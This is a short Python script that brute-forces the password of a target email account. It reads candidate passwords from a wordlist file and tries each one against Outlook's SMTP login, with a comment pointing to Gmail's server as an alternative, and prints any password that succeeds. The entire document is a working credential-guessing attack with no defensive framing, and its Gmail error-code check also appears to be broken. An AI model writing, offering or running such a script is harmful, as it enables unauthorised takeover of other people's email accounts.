import smtplib

# Outlook.com | for Google 'smtp.gmail.com'
smtp_server = 'smtp-mail.outlook.com'
smtp_port = 587

target_email = 'target_adress@hotmail.com'
datas = 'passwords.txt'

m = smtplib.SMTP(smtp_server, smtp_port)
m.ehlo()
m.starttls()


with open(datas) as passwords:
    for password in passwords:
        password = password.replace('\n', '')
        try:
            m.login(target_email, password)
            print('[*] Password found: %s' % (password))
            m.close()
            exit()
        except smtplib.SMTPAuthenticationError as e:
            if e[0] == 534:  # Only for Gmail
                print('[*] Password found: %s' % (password))
                exit()
            else:
                print('[*] Attempting password %s ..failed' % (password))
